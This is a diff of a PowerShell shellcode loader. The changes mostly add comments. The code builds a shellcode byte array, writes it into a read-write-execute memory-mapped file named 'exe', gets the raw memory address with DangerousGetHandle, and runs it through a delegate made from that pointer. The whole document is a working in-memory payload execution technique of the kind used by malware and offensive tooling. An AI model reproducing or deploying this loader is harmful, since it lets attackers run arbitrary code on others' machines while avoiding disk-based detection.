@@ -29,7 +29,7 @@ function Get-DelegateType
 
 $enc = [System.Text.Encoding]::UTF8 #using UTF8 means bytewise translation is 1:1 for size.
 
-# Stack alignment 
+# Shellcode Stub 
 $shellcode = [byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                         0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                         0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
@@ -57,17 +57,23 @@ $shellcode += $shellcodeadd
 #Add RET to attempt to prevent Powershell from crashing when exiting
 $shellcode += [byte[]]@(0xC3)
 
+#Create MMF w/ RWX & length of shellcode, with MMF name 'exe'
 [System.IO.MemoryMappedFiles.MemoryMappedFile]$mmfml = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([string]'exe', [long]$shellcodeadd.length,
 [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute, [System.IO.MemoryMappedFiles.MemoryMappedFileOptions]::None, 
 [System.IO.MemoryMappedFiles.MemoryMappedFileSecurity]::new(), [System.IO.HandleInheritability]::Inheritable)
+
+#Create MMF View Stream & write contents of shellcode to the MMF via the View Stream
 $view = $mmfml.CreateViewStream(0,0)
 $view.Write($shellcode, 0,$shellcode.length)
 $view.Position = 0
+
+#Create View Accessor, get shellcode memory location using DangerousGetHandle()
 $acc = $mmfml.CreateViewAccessor(0,0, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)
 $memhandle = $acc.SafeMemoryMappedViewHandle.DangerousGetHandle()
 #returns shellcode memory location...
 Write-Host "Executing payload at:"
 Write-Host 0x$($memhandle.ToString("X$([IntPtr]::Size*2)"))""
+
 #Build a Delegate & Invoke from Pointer
 $ByRefDelegate = Get-DelegateType @([IntPtr].MakeByRefType()) ([Void])
 $ByRef = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memhandle, $ByRefDelegate)
